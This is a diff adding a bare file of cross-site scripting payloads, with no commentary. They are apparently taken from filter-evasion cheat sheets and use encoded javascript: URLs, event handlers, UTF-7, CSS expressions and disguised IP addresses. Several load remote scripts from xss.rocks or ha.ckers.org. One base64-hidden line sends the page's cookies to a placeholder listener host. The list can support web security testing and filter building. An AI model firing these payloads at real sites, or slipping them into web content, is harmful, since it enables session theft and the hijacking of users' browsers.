@@ -1,0 +1,79 @@
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<SCRIPT>alert('XSS');</SCRIPT>
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+allowScriptAccess="never"
+allownetworking="internal"
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")"; eval(a+b+c+d);
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<XML SRC="xsstest.xml" ID=I></XML>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>
+<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<IMG SRC="httx://badguy.com/a.jpg">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
+<A HREF="h tt  p://6	6.000146.0x7.147/">XSS</A>
+<A HREF="//www.google.com/">XSS</A>
+<A HREF="//google">XSS</A>
+<A HREF="http://[email protected]">XSS</A>
+<A HREF="http://google:ha.ckers.org">XSS</A>
+<A HREF="http://google.com/">XSS</A>
+<A HREF="http://www.google.com./">XSS</A>
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+http://www.google.com/
+java&\#x09;script:
+java	script:
+<A HREF="http://www.google.com/ogle.com/">XSS</A>
+a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
+<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
+/?param=<javascript:alert(document.cookie>)
+/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Video> <source onerror = "javascript: alert (XSS)">
+<Input value = "XSS" type = text>
+<applet code="javascript:confirm(document.cookie);">
+<isindex x="javascript:" onmouseover="alert(XSS)">
+"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><img src="x:x" onerror="alert(XSS)">
+"><iframe src="javascript:alert(XSS)">
+<object data="javascript:alert(XSS)">
+<isindex type=image src=1 onerror=alert(XSS)>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert(1)">X
+</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
+<style>//*{x:expression(alert(/xss/))}//<style></style>
+<img src="/" =_=" title="onerror='prompt(1)'">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+<script x> alert(1) </script 1=2
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+
